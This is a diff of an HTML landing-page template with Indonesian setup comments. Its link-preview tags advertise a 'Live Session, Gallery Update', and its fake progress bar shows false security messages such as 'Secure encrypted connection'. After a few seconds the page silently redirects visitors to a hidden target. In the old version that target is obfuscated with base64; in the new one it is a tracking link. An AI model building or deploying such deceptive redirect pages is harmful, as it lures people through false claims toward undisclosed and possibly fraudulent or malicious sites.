@@ -1,305 +1,188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-<!-- ================== BASIC ================== -->
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
 
-<!-- ================== SAFE TITLE ================== -->
-<title>Community Feed Update</title>
+  <!-- ================= OG PREVIEW ================= -->
+  <!-- Ganti title/description/image sesuai kebutuhan -->
+  <meta property="og:title" content="✨Live Session, Gallery Update" />
+  <meta property="og:description" content="A Small Collections Preview " />
+  <meta property="og:image" content="https://i.imgur.com/3zNy07X.jpeg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="website" />
 
-<!-- ================== SAFE DESCRIPTION ================== -->
-<meta name="description" content="Latest shared content available">
+  <!-- WAJIB ganti kalau domain berubah -->
+  <meta property="og:url" content="https:/room2.lovegallery.online" />
 
-<!-- ================== THEME ================== -->
-<meta name="theme-color" content="#0b1220">
+  <!-- ================= BASIC SEO ================= -->
+  <meta name="robots" content="index, follow" />
+  <meta name="theme-color" content="#0f0f0f" />
 
-<!-- ================== SAFE OG META ================== -->
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-<!-- GANTI JUDUL PREVIEW -->
-<meta property="og:title" content="📌 Community Update">
+    body {
+      background: #0f0f0f;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
 
-<!-- GANTI DESKRIPSI PREVIEW -->
-<meta property="og:description" content="Tap to view the latest update">
+    .container {
+      width: 100%;
+      max-width: 340px;
+      text-align: center;
+      padding: 20px;
+    }
 
-<!-- ================== EDIT IMAGE ================== -->
-<!-- TARUH FILE preview1.jpg DI ROOT REPO -->
-<meta property="og:image" content="https://room2.lovegallery.online/preview1.jpg">
-<meta property="og:image:secure_url" content="https://room2.lovegallery.online/preview1.jpg">
-<meta property="og:image:type" content="image/jpeg">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
+    /* ===== Spinner ===== */
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(255,255,255,0.08);
+      border-top: 5px solid #00ffcc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 25px;
+    }
 
-<!-- ================== EDIT DOMAIN ================== -->
-<meta property="og:url" content="https://room2.lovegallery.online/">
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
 
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="CommunityFeed">
+    h2 {
+      font-size: 22px;
+      margin-bottom: 14px;
+      font-weight: 600;
+    }
 
-<!-- ================== TWITTER ================== -->
-<meta name="twitter:card" content="summary_large_image">
+    p {
+      font-size: 13px;
+      opacity: 0.65;
+      margin-top: 10px;
+    }
 
-<!-- ================== PRELOAD ================== -->
-<link rel="preload" as="image" href="/preview1.jpg">
+    /* ===== Progress Bar ===== */
+    .progress-wrapper {
+      width: 100%;
+      height: 10px;
+      background: #1d1d1d;
+      border-radius: 999px;
+      overflow: hidden;
+      margin-top: 15px;
+    }
 
-<style>
+    .progress {
+      width: 0%;
+      height: 100%;
+      border-radius: 999px;
+      background: linear-gradient(90deg, #00ffcc, #00c3ff);
+      transition: width 0.25s ease;
+    }
 
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-}
-
-html,body{
-  width:100%;
-  height:100%;
-}
-
-body{
-  overflow:hidden;
-  font-family:Arial,sans-serif;
-  color:#fff;
-  background:
-    radial-gradient(circle at top,#152238 0%,#05070c 60%);
-}
-
-/* ================== MAIN ================== */
-
-.container{
-  width:100%;
-  height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-  padding:20px;
-  text-align:center;
-}
-
-/* ================== IMAGE ================== */
-
-.preview{
-  width:100%;
-  max-width:430px;
-  border-radius:24px;
-  overflow:hidden;
-  position:relative;
-  box-shadow:
-    0 0 25px rgba(59,130,246,0.20),
-    0 0 60px rgba(59,130,246,0.08);
-  animation:float 3.5s ease-in-out infinite;
-}
-
-.preview::after{
-  content:"";
-  position:absolute;
-  inset:0;
-  background:
-    linear-gradient(
-      to top,
-      rgba(0,0,0,0.15),
-      transparent
-    );
-}
-
-.preview img{
-  width:100%;
-  display:block;
-}
-
-/* ================== FLOAT ================== */
-
-@keyframes float{
-  50%{
-    transform:translateY(-6px);
-  }
-}
-
-/* ================== STATUS ================== */
-
-.status{
-  margin-top:22px;
-  font-size:28px;
-  font-weight:700;
-  letter-spacing:1px;
-}
-
-.dot{
-  color:#60a5fa;
-  animation:blink 1s infinite;
-}
-
-@keyframes blink{
-  50%{
-    opacity:0.35;
-  }
-}
-
-/* ================== LOADER ================== */
-
-.loading-box{
-  width:290px;
-  margin-top:22px;
-}
-
-.loading-text{
-  font-size:14px;
-  color:#d5d5d5;
-  margin-bottom:12px;
-  letter-spacing:0.3px;
-}
-
-.bar{
-  width:100%;
-  height:10px;
-  background:#161616;
-  border-radius:999px;
-  overflow:hidden;
-  position:relative;
-}
-
-.fill{
-  width:0%;
-  height:100%;
-  border-radius:999px;
-
-  background:
-    linear-gradient(
-      90deg,
-      #2563eb,
-      #60a5fa,
-      #93c5fd
-    );
-
-  animation:load 5s linear forwards;
-  position:relative;
-}
-
-.fill::after{
-  content:"";
-  position:absolute;
-  top:0;
-  right:0;
-  width:45px;
-  height:100%;
-  background:rgba(255,255,255,0.35);
-  filter:blur(10px);
-}
-
-@keyframes load{
-  from{
-    width:0%;
-  }
-
-  to{
-    width:100%;
-  }
-}
-
-/* ================== PERCENT ================== */
-
-.percent{
-  margin-top:10px;
-  color:#8ab4ff;
-  font-size:13px;
-  font-weight:bold;
-}
-
-/* ================== NOTES ================== */
-
-.note{
-  margin-top:16px;
-  color:#9b9b9b;
-  font-size:13px;
-  letter-spacing:0.2px;
-}
-
-.secure{
-  margin-top:8px;
-  color:#4ade80;
-  font-size:12px;
-}
-
-</style>
+    .percent {
+      margin-top: 10px;
+      font-size: 14px;
+      opacity: 0.8;
+    }
+  </style>
 </head>
 
 <body>
 
-<div class="container">
+  <div class="container">
 
-  <!-- ================== EDIT MAIN IMAGE ================== -->
-  <div class="preview">
-    <img src="/preview1.jpg" alt="Preview">
-  </div>
+    <div class="loader"></div>
 
-  <!-- ================== STATUS ================== -->
-  <div class="status">
-    <span class="dot">●</span> CONNECTING...
-  </div>
+    <h2 id="status">Preparing your content...</h2>
 
-  <!-- ================== LOADING ================== -->
-  <div class="loading-box">
-
-    <div class="loading-text">
-      Verifying secure session...
+    <div class="progress-wrapper">
+      <div class="progress" id="progress"></div>
     </div>
 
-    <div class="bar">
-      <div class="fill"></div>
-    </div>
+    <div class="percent" id="percent">0%</div>
 
-    <!-- AUTO PERCENT -->
-    <div class="percent" id="percent">
-      0%
-    </div>
+    <p>Please wait a moment</p>
 
   </div>
 
-  <!-- ================== FOOTER NOTE ================== -->
-  <div class="note">
-    Please wait while loading content...
-  </div>
+  <script>
+    // ================= SETTINGS =================
 
-  <div class="secure">
-    ✓ Secure encrypted connection
-  </div>
+    // GANTI ke link tujuan kamu
+    const REDIRECT_URL = "https://dfbjbie.trackspace365.com/p/6zDzx";
 
-</div>
+    // Total waktu loading (ms)
+    const TOTAL_DURATION = 5000;
 
-<script>
+    // ================= ELEMENT =================
 
-  // ================== ENCODED TARGET LINK ==================
+    const progressBar = document.getElementById("progress");
+    const percentText = document.getElementById("percent");
+    const statusText = document.getElementById("status");
 
-  const target = atob(
-    "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk="
-  );
+    // ================= LOADING SYSTEM =================
 
-  // ================== AUTO PERCENT ==================
+    let progress = 0;
 
-  const percent = document.getElementById("percent");
+    const interval = setInterval(() => {
 
-  let count = 0;
+      // Random biar lebih natural
+      progress += Math.random() * 12;
 
-  const loader = setInterval(() => {
+      if (progress > 100) {
+        progress = 100;
+      }
 
-    count++;
+      // Update UI
+      progressBar.style.width = progress + "%";
+      percentText.innerText = Math.floor(progress) + "%";
 
-    percent.innerText = count + "%";
+      // Dynamic status
+      if (progress < 25) {
+        statusText.innerText = "Preparing your content...";
+      }
+      else if (progress < 50) {
+        statusText.innerText = "Connecting to secure server...";
+      }
+      else if (progress < 75) {
+        statusText.innerText = "Loading media assets...";
+      }
+      else if (progress < 95) {
+        statusText.innerText = "Almost ready...";
+      }
+      else {
+        statusText.innerText = "Launching...";
+      }
 
-    if(count >= 100){
-      clearInterval(loader);
-    }
+      // Redirect
+      if (progress >= 100) {
+        clearInterval(interval);
 
-  }, 50);
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 500);
+      }
 
-  // ================== REDIRECT TIMER ==================
-
-  setTimeout(() => {
-    window.location.href = target;
-  }, 5000);
-
-</script>
+    }, TOTAL_DURATION / 25);
+  </script>
 
 </body>
 </html>
